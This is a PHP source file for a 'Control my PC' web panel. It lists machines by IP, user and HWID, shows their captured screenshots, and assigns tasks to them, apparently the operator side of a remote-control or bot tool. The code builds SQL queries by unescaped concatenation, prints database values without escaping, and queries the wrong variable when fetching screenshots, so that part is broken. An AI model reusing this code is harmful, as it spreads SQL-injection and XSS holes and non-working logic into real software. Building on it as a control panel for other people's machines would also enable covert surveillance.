<?php
	include("include/settings.php");
	
	$status = "";
	
	$conn = new mysqli($host, $user, $pass, "controler");
	
	$sql = "SELECT COUNT(*) FROM `user`";
	$result = $conn->query($sql);
	$row = $result->fetch_assoc();
	$count_int = $row['COUNT(*)'];
	if ($count_int < 1) {
		$status = "No user";
	}
	else {
		$status = "Have user";
	}
?>

<!DOCTYPE HTML>
<html>
	<head>
		<meta charset="utf-8">
		<link rel="stylesheet" type="text/css" href="css/my.css">
		<title>Control my PC | Panel</title>
	</head>
	<body>
		<div class="menu">
			<div class="right">
				<a href="new_task.php"><button class="green-bt">Add task</button></a>
				<a href="del_task.php"><button class="red-bt">Delete task`s</button></a>
			</div>
		</div>
		<div class="content">
		<br>
		<div class="table100 ver3 m-b-110">
			<div class="table100-head">
				<table>
					<thead>
						<tr class="row100 head">
							<th class="cell100 column1">IP</th>
							<th class="cell100 column2">User</th>
							<th class="cell100 column3">HWID</th>
							<th class="cell100 column4">Screenshot</th>
							<th class="cell100 column5">Set task</th>
						</tr>
					</thead>
				</table>
			</div>

			<div class="table100-body js-pscroll">
				<table>
					<tbody>
						<?php
						
							if ($status == "No user") {
								print '<tr class="row100 body"><td colspan="5">No user</td></tr>';
							} else {
								$sql = "SELECT `id` FROM `user`";
								$result = $conn->query($sql);
								while($row2 = $result->fetch_assoc()) {
									$sh = array();
									$a = $row2["id"];
									$sql2 = "SELECT `ip`, `user`, `hwid` FROM `user` WHERE `id` = ".$a;
									$result2 = $conn->query($sql2);
									$row = $result2->fetch_assoc();
									
									$sql3 = 'SELECT COUNT(*) FROM `screenshot`';
									$result3 = $conn->query($sql3);
									$row3 = $result3->fetch_assoc();
									
									if($row3['COUNT(*)'] > 0) {
										$sql4 = "SELECT `base64` FROM `screenshot` WHERE `ip` = ".$row["ip"];
										$result4 = $conn->query($sql);
										while($row4 = $result4->fetch_assoc()) {
											array_push($sh, $row4["base64"]);
										}
									} else {
										array_push($sh, "No screenshot");
									}
									
									print '<tr class="row100 body"><td class="cell100 column1">'.$row["ip"].'</td>
									<td class="cell100 column2">'.$row["user"].'</td>
									<td class="cell100 column3">'.$row["hwid"].'</td>
									<td class="cell100 column4">';
									for($nc = 0; $nc != sizeof($sh); $nc++){
										if ($sh[$nc] == "No screenshot") {
											print 'No screenshot';
											break;
										}
										print '<a href="data:image/png;base64,'.$sh[$nc].'"> Img'.$nc.'</a>';
									}
									print '</td>
									<td class="cell100 column5"><form action="new_task.php" method="post"><input type="hidden" name="id" value="'.$a.'"><button class="green-bt">Add task</button></form></td>
									</tr>';
								}
							}
						
						?>
					</tbody>
				</table>
			</div>
		</div>
	</body>
</html>